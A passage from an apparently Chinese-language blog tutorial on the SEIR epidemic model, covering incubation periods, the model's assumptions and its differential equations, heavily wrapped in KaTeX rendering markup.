class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span></span></span></span></span> 等。</p> \n <p>传染病大多具有潜伏期（incubation period），也叫隐蔽期，是指从被病原体侵入肌体到最早临床症状出现的一段时间。在潜伏期的后期一般具有传染性。不同的传染病的潜伏期长短不同，从短至数小时到长达数年，但同一种传染病有固定的（平均）潜伏期。例如，流感的潜伏期为 1～3天，冠状病毒感染的潜伏期为4~7天，新型冠状病毒肺炎传染病（COVID-19）的潜伏期为1-14天（* 来自：新型冠状病毒肺炎诊疗方案试行第八版，潜伏时间 1～14天，多为3～7天，在潜伏期具有传染性），肺结核的潜伏期从数周到数十年。</p> \n <p>SEIR 模型考虑存在易感者（Susceptible）、暴露者（Exposed）、患病者（Infectious）和康复者（Recovered）四类人群，适用于具有潜伏期、治愈后获得终身免疫的传染病。易感者（S 类）被感染后成为潜伏者（E类），随后发病成为患病者（I 类），治愈后成为康复者（R类）。这种情况更为复杂，也更为接近实际情况。</p> \n <p>SEIR 模型的仓室结构示意图如下：</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615200836469.png#pic_center\" alt=\"在这里插入图片描述\"></p> \n <blockquote> \n  <p><strong>欢迎关注<a href=\"https://blog.csdn.net/youcans/category_11031563.html\">『Python小白的数学建模课 @ Youcans』</a>系列，每周持续更新</strong><br> <a href=\"https://blog.csdn.net/youcans/article/details/117740466\">Python小白的数学建模课-B2. 新冠疫情 SI模型</a><br> <a href=\"https://blog.csdn.net/youcans/article/details/117786272\">Python小白的数学建模课-B3. 新冠疫情 SIS模型</a><br> <a href=\"https://blog.csdn.net/youcans/article/details/117843875\">Python小白的数学建模课-B4. 新冠疫情 SIR模型</a><br> <a href=\"https://blog.csdn.net/youcans/article/details/117932162\">Python小白的数学建模课-B5. 新冠疫情 SEIR模型</a><br> <a href=\"https://blog.csdn.net/youcans/article/details/118084539\">Python小白的数学建模课-B6. 新冠疫情 SEIR改进模型</a></p> \n </blockquote> \n <h3><a id=\"12_SEIR__38\"></a>1.2 SEIR 模型假设</h3> \n <ol>\n  <li> <p>考察地区的总人数 N 不变，即不考虑生死或迁移；</p> </li>\n  <li> <p>人群分为易感者（S 类）、暴露者（E 类）、患病者（I 类）和康复者（R 类）四类；</p> </li>\n  <li> <p>易感者（S 类）与患病者（I 类）有效接触即变为暴露者（E 类），暴露者（E 类）经过平均潜伏期后成为患病者（I 类）；患病者（I 类）可被治愈，治愈后变为康复者（R 类）；康复者（R类）获得终身免疫不再易感；</p> </li>\n  <li> <p>将第 t 天时 S 类、E 类、I 类、R 类人群的占比记为 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> s ( t ) s(t) </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\">s</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\">t</span><span class=\"mclose\">)</span></span></span></span></span>、<span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> e ( t ) e(t) </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\">e</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\">t</span><span class=\"mclose\">)</span></span></span></span></span>、<span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> i ( t ) i(t) </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\">i</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\">t</span><span class=\"mclose\">)</span></span></span></span></span>、<span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> r ( t ) r(t) </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.02778em;\">r</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\">t</span><span class=\"mclose\">)</span></span></span></span></span>，数量分别为 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> S ( t ) S(t) </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.05764em;\">S</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\">t</span><span class=\"mclose\">)</span></span></span></span></span>、<span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> E ( t ) E(t) </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.05764em;\">E</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\">t</span><span class=\"mclose\">)</span></span></span></span></span>、<span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> I ( t ) I(t) </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.07847em;\">I</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\">t</span><span class=\"mclose\">)</span></span></span></span></span>、<span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> R ( t ) R(t) </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.00773em;\">R</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\">t</span><span class=\"mclose\">)</span></span></span></span></span>；初始日期 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> t = 0 t=0 </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.61508em; vertical-align: 0em;\"></span><span class=\"mord mathdefault\">t</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 0.64444em; vertical-align: 0em;\"></span><span class=\"mord\">0</span></span></span></span></span> 时，各类人群占比的初值为 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> s 0 s_0 </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.58056em; vertical-align: -0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">s</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span></span></span></span></span>、<span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> e 0 e_0 </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.58056em; vertical-align: -0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span></span></span></span></span>、<span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> i 0 i_0 </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.80952em; vertical-align: -0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span></span></span></span></span>、<span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> r 0 r_0 </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.58056em; vertical-align: -0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right: 0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: -0.02778em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span></span></span></span></span>；</p> </li>\n  <li> <p>日接触数 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> λ \\lambda </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.69444em; vertical-align: 0em;\"></span><span class=\"mord mathdefault\">λ</span></span></span></span></span>，每个患病者每天有效接触的易感者的平均人数；</p> </li>\n  <li> <p>日发病率 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> δ \\delta </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.69444em; vertical-align: 0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.03785em;\">δ</span></span></span></span></span>，每天发病成为患病者的暴露者占暴露者总数的比例；</p> </li>\n  <li> <p>日治愈率 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> μ \\mu </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.625em; vertical-align: -0.19444em;\"></span><span class=\"mord mathdefault\">μ</span></span></span></span></span>，每天被治愈的患病者人数占患病者总数的比例，即平均治愈天数为 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> 1 / μ 1/\\mu </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord\">1</span><span class=\"mord\">/</span><span class=\"mord mathdefault\">μ</span></span></span></span></span>；</p> </li>\n  <li> <p>传染期接触数 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> σ = λ / μ \\sigma = \\lambda / \\mu </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.43056em; vertical-align: 0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">σ</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\">λ</span><span class=\"mord\">/</span><span class=\"mord mathdefault\">μ</span></span></span></span></span>，即每个患病者在整个传染期内有效接触的易感者人数。</p> </li>\n </ol> \n <br> \n <h3><a id=\"13_SEIR__58\"></a>1.3 SEIR 模型的微分方程</h3> \n <p>由<br> <span class=\"katex--display\"><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"> { N d s d t = − N λ s i N d e d t = N λ s i − N δ e N d i d t = N δ e − N μ i N d r d t = N μ i \\begin{cases} N \\frac{ds}{dt} = - N \\lambda s i\\\\ N \\frac{de}{dt} = N \\lambda s i - N \\delta e\\\\ N \\frac{di}{dt} = N \\delta e - N \\mu i\\\\ N \\frac{dr}{dt} = N \\mu i\\\\ \\end{cases} </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 5.76em; vertical-align: -2.63em;\"></span><span class=\"minner\"><span class=\"mopen\"><span class=\"delimsizing mult\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 2.95002em;\"><span class=\"\" style=\"top: -1.59999em;\"><span class=\"pstrut\" style=\"height: 3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span class=\"\">⎩</span></span></span><span class=\"\" style=\"top: -1.59999em;\"><span class=\"pstrut\" style=\"height: 3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span class=\"\">⎪</span></span></span><span class=\"\" style=\"top: -1.89999em;\"><span class=\"pstrut\" style=\"height: 3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span class=\"\">⎪</span></span></span><span class=\"\" style=\"top: -2.19999em;\"><span class=\"pstrut\" style=\"height: 3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span class=\"\">⎪</span></span></span><span class=\"\" style=\"top: -3.15001em;\"><span class=\"pstrut\" style=\"height: 3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span class=\"\">⎨</span></span></span><span class=\"\" style=\"top: -4.30001em;\"><span class=\"pstrut\" style=\"height: 3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span class=\"\">⎪</span></span></span><span class=\"\" style=\"top: -4.60001em;\"><span class=\"pstrut\" style=\"height: 3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span class=\"\">⎪</span></span></span><span class=\"\" style=\"top: -4.90001em;\"><span class=\"pstrut\" style=\"height: 3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span class=\"\">⎪</span></span></span><span class=\"\" style=\"top: -5.20002em;\"><span class=\"pstrut\" style=\"height: 3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span class=\"\">⎧</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 2.45002em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 3.13em;\"><span class=\"\" style=\"top: -5.13em;\"><span class=\"pstrut\" style=\"height: 3.008em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right: 0.10903em;\">N</span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.880108em;\"><span class=\"\" style=\"top: -2.655em;\"><span class=\"pstrut\" style=\"height: 3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">d</span><span class=\"mord mathdefault mtight\">t</span></span></span></span><span class=\"\" style=\"top: -3.23em;\"><span class=\"pstrut\" style=\"height: 3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width: 0.04em;\"></span></span><span class=\"\" style=\"top: -3.394em;\"><span class=\"pstrut\" style=\"height: 3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">d</span><span class=\"mord mathdefault mtight\">s</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.345em;\"><span class=\"\"></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mord\">−</span><span class=\"mord mathdefault\" style=\"margin-right: 0.10903em;\">N</span><span class=\"mord mathdefault\">λ</span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">i</span></span></span><span class=\"\" style=\"top: -3.69em;\"><span class=\"pstrut\" style=\"height: 3.008em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right: 0.10903em;\">N</span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.880108em;\"><span class=\"\" style=\"top: -2.655em;\"><span class=\"pstrut\" style=\"height: 3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">d</span><span class=\"mord mathdefault mtight\">t</span></span></span></span><span class=\"\" style=\"top: -3.23em;\"><span class=\"pstrut\" style=\"height: 3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width: 0.04em;\"></span></span><span class=\"\" style=\"top: -3.394em;\"><span class=\"pstrut\" style=\"height: 3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">d</span><span class=\"mord mathdefault mtight\">e</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.345em;\"><span class=\"\"></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.10903em;\">N</span><span class=\"mord mathdefault\">λ</span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">i</span><span class=\"mspace\" style=\"margin-right: 0.222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right: 0.222222em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.10903em;\">N</span><span class=\"mord mathdefault\" style=\"margin-right: 0.03785em;\">δ</span><span class=\"mord mathdefault\">e</span></span></span><span class=\"\" style=\"top: -2.25em;\"><span class=\"pstrut\" style=\"height: 3.008em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right: 0.10903em;\">N</span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.880108em;\"><span class=\"\" style=\"top: -2.655em;\"><span class=\"pstrut\" style=\"height: 3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">d</span><span class=\"mord mathdefault mtight\">t</span></span></span></span><span class=\"\" style=\"top: -3.23em;\"><span class=\"pstrut\" style=\"height: 3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width: 0.04em;\"></span></span><span class=\"\" style=\"top: -3.394em;\"><span class=\"pstrut\" style=\"height: 3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">d</span><span class=\"mord mathdefault mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.345em;\"><span class=\"\"></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.10903em;\">N</span><span class=\"mord mathdefault\" style=\"margin-right: 0.03785em;\">δ</span><span class=\"mord mathdefault\">e</span><span class=\"mspace\" style=\"margin-right: 0.222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right: 0.222222em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.10903em;\">N</span><span class=\"mord mathdefault\">μ</span><span class=\"mord mathdefault\">i</span></span></span><span class=\"\" style=\"top: -0.81em;\"><span class=\"pstrut\" style=\"height: 3.008em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right: 0.10903em;\">N</span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.880108em;\"><span class=\"\" style=\"top: -2.655em;\"><span class=\"pstrut\" style=\"height: 3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">d</span><span class=\"mord mathdefault mtight\">t</span></span></span></span><span class=\"\" style=\"top: -3.23em;\"><span class=\"pstrut\" style=\"height: 3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width: 0.04em;\"></span></span><span class=\"\" style=\"top: -3.394em;\"><span class=\"pstrut\" style=\"height: 3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">d</span><span class=\"mord mathdefault mtight\" style=\"margin-right: 0.02778em;\">r</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.345em;\"><span class=\"\"></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.10903em;\">N</span><span class=\"mord mathdefault\">μ</span><span class=\"mord mathdefault\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 2.63em;\"><span class=\"\"></span></span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span></span></span></span><br> 得：<br> <span class=\"katex--display\"><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"> { d s d t = − λ s i , s ( 0 ) = s 0 d e d t = λ s i − δ e , e ( 0 ) = e 0 d i d t = δ e − μ i , i ( 0 ) = i 0 \\begin{cases} \\frac{ds}{dt} = -\\lambda s i, &amp;s(0)=s_0\\\\ \\frac{de}{dt} = \\lambda s i - \\delta e, &amp;e(0)=e_0\\\\ \\frac{di}{dt} = \\delta e - \\mu i, &amp;i(0)=i_0 \\end{cases} </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 4.32em; vertical-align: -1.91em;\"></span><span class=\"minner\"><span class=\"mopen\"><span class=\"delimsizing mult\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 2.35002em;\"><span class=\"\" style=\"top: -2.19999em;\"><span class=\"pstrut\" style=\"height: 3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span class=\"\">⎩</span></span></span><span class=\"\" style=\"top: -2.19999em;\"><span class=\"pstrut\" style=\"height: 3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span class=\"\">⎪</span></span></span><span class=\"\" style=\"top: -3.15001em;\"><span class=\"pstrut\" style=\"height: 3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span class=\"\">⎨</span></span></span><span class=\"\" style=\"top: -4.30001em;\"><span class=\"pstrut\" style=\"height: 3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span class=\"\">⎪</span></span></span><span class=\"\" style=\"top: -4.60002em;\"><span class=\"pstrut\" style=\"height: 3.15em;\"></span><span class=\"delimsizinginner delim-size4\"><span class=\"\">⎧</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 1.85002em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 2.41em;\"><span class=\"\" style=\"top: -4.41em;\"><span class=\"pstrut\" style=\"height: 3.008em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.880108em;\"><span class=\"\" style=\"top: -2.655em;\"><span class=\"pstrut\" style=\"height: 3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">d</span><span class=\"mord mathdefault mtight\">t</span></span></span></span><span class=\"\" style=\"top: -3.23em;\"><span class=\"pstrut\" style=\"height: 3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width: 0.04em;\"></span></span><span class=\"\" style=\"top: -3.394em;\"><span class=\"pstrut\" style=\"height: 3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">d</span><span class=\"mord mathdefault mtight\">s</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.345em;\"><span class=\"\"></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mord\">−</span><span class=\"mord mathdefault\">λ</span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">i</span><span class=\"mpunct\">,</span></span></span><span class=\"\" style=\"top: -2.97em;\"><span class=\"pstrut\" style=\"height: 3.008em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.880108em;\"><span class=\"\" style=\"top: -2.655em;\"><span class=\"pstrut\" style=\"height: 3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">d</span><span class=\"mord mathdefault mtight\">t</span></span></span></span><span class=\"\" style=\"top: -3.23em;\"><span class=\"pstrut\" style=\"height: 3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width: 0.04em;\"></span></span><span class=\"\" style=\"top: -3.394em;\"><span class=\"pstrut\" style=\"height: 3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">d</span><span class=\"mord mathdefault mtight\">e</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.345em;\"><span class=\"\"></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mord mathdefault\">λ</span><span class=\"mord mathdefault\">s</span><span class=\"mord mathdefault\">i</span><span class=\"mspace\" style=\"margin-right: 0.222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right: 0.222222em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.03785em;\">δ</span><span class=\"mord mathdefault\">e</span><span class=\"mpunct\">,</span></span></span><span class=\"\" style=\"top: -1.53em;\"><span class=\"pstrut\" style=\"height: 3.008em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.880108em;\"><span class=\"\" style=\"top: -2.655em;\"><span class=\"pstrut\" style=\"height: 3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">d</span><span class=\"mord mathdefault mtight\">t</span></span></span></span><span class=\"\" style=\"top: -3.23em;\"><span class=\"pstrut\" style=\"height: 3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width: 0.04em;\"></span></span><span class=\"\" style=\"top: -3.394em;\"><span class=\"pstrut\" style=\"height: 3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">d</span><span class=\"mord mathdefault mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.345em;\"><span class=\"\"></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.03785em;\">δ</span><span class=\"mord mathdefault\">e</span><span class=\"mspace\" style=\"margin-right: 0.222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right: 0.222222em;\"></span><span class=\"mord mathdefault\">μ</span><span class=\"mord mathdefault\">i</span><span class=\"mpunct\">,</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 1.91em;\"><span class=\"\"></span></span></span></span></span><span class=\"arraycolsep\" style=\"width: 1em;\"></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 2.41em;\"><span class=\"\" style=\"top: -4.41em;\"><span class=\"pstrut\" style=\"height: 3.008em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">s</span><span class=\"mopen\">(</span><span class=\"mord\">0</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">s</span><span class=\"msupsub\"><span 